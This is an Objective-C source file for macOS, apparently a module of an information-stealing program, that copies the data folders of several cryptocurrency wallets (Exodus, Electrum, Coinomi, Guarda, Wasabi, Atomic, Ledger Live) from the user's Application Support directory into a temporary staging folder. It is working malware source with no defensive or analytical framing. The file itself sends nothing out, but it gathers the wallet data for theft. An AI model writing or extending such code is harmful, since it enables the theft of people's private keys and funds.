#ifdef DEBUG
#define DebugLog(...) NSLog(__VA_ARGS__)
#else
#define DebugLog(...) (void)0
#endif


#import "Wallets.h"
#import "Tools.h"
#import <Foundation/Foundation.h>
#import "globals.h"

@implementation Wallets

- (void)collectWalletData {

    NSArray<NSString *> *walletPaths = @[
        @"Exodus/exodus.wallet/",
        @"electrum/wallets/",
        @"Coinomi/wallets/",
        @"Guarda/Local Storage/leveldb/",
        @"walletwasabi/client/Wallets/",
        @"atomic/Local Storage/leveldb/",
        @"Ledger Live/"
    ];
    

    NSString *walletsPathDest = [TEMPORARY_PATH stringByAppendingPathComponent:@"Wallets"];
    NSString *homeDir = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support"];
    
    for (NSString *walletPath in walletPaths) {
        

        NSString *sourceDir = [homeDir stringByAppendingPathComponent:walletPath];
        NSString *walletName = [[walletPath componentsSeparatedByString:@"/"] firstObject];
        NSString *destDir = [walletsPathDest stringByAppendingPathComponent:walletName];
        
        if ([[NSFileManager defaultManager] fileExistsAtPath:sourceDir]) {
            [Tools copyDirectoryWithFiles:sourceDir destinationDirectory:destDir];
            DebugLog(@"Copied %@ to %@", sourceDir, destDir);
        } else {
            DebugLog(@"Source directory %@ is empty or does not exist, skipping.", sourceDir);
        }
    }
}

@end
